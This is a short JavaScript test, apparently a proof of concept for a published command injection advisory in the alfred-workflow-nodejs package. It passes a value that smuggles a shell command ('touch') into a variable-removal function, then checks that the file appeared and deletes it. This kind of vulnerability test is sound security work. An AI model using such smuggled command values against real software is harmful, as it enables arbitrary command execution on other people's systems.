//https://snyk.io/vuln/SNYK-JS-ALFREDWORKFLOWNODEJS-608975
test("Command Injection in killing", () => {
  const AlfredNode = require("alfred-workflow-nodejs");
  const fs = require("fs");
  const path = "./alfred-workflow-nodejs";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  var utils = AlfredNode.utils;
  utils.wfVars.remove(' "; touch alfred-workflow-nodejs #', false);

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
